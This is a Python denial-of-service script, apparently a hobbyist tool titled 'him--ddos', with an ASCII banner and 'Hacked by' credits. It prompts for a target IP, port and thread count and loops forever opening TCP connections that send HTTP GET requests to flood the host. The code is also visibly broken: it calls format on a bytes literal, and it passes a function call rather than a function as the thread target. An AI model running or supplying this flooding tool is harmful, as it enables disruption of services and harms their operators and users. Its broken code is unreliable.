import socket
import os
import threading
os.system('title him--ddos')
e1='''
**************************************************************
__     ___            _ _             
\ \   / (_)          | (_)            
 \ \_/ / _ _ __      | |_ _ __   __ _ 
  \   / | | '_ \ _   | | | '_ \ / _` |
   | |  | | | | | |__| | | | | | (_| |
   |_|  |_|_| |_|\____/|_|_| |_|\__, |
                                 __/ |
                                |___/
**************************************************************                                
'''

print(e1)

print('Hacked by him#1337\nwelcome to https://space.bilibili.com/590491558 or https://github.com/him114514\n')
def ddos(ip):
   while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b'GET / HTTP/1.1\r\nHost: {0}\r\n\r\n'.format(ip))
            print('true')
            s.close()
        except:
            pass 
def main(cishu):
    for i in range(cishu):
        h = threading.Thread(target=ddos(ip))
        h.start()
    
while True:
    ip=input('him-ddos-ip: ')
    try:
        port=int(input('him-ddos-port: '))
    except ValueError as error1:
        print(f'错误:{error1}')
        continue
    cishu=int(input('him-ddos-threading: '))
    main(cishu)

